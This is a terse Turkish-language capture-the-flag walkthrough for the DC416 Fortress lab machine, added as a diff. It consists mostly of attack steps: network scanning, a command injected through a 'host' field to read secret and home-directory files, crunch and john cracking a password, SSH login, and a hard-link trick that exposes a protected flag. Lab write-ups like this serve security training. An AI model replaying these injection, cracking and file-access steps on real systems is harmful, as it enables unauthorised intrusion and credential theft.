@@ -1,0 +1,24 @@
+DC416-FORTRESS MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP Adresi 192.168.2.103 bulundu.
+2 - nmap -sT -A 192.168.2.103
+3 - dirbuster -> scanner.php
+4 - Burp Suite -> Repeater 
+5 - 
+host=127.0.0.1
+cat s1kr3t/flag.txt --> FLAG 1
+6 - 
+host=127.0.0.1
+cat k1ngd0m_k3yz/master
+7 - 
+host=127.0.0.1
+cat /home/craven/hint.txt -> %%%petname^
+8 - 
+host = 127.0.0.1
+cat /home/craven/reminder.txt -> pet = qwerty --> %%%qwerty^
+9 - crunch 10 10 -t %%%qwerty^ -o fortress_crunch.txt
+10 - john hash -w=fortress_crunch.txt, craven:931qwerty?
+11 - ssh craven@192.168.2.103
+12 - cat flag.txt --> FLAG 2
+13 - cd /tmp
+14 - ln /home/vulnhub/flag.txt ln_flg.txt
+15 - cd /home/vulnhub, ./reader /tmp/ln_flg.txt -> FLAG 3
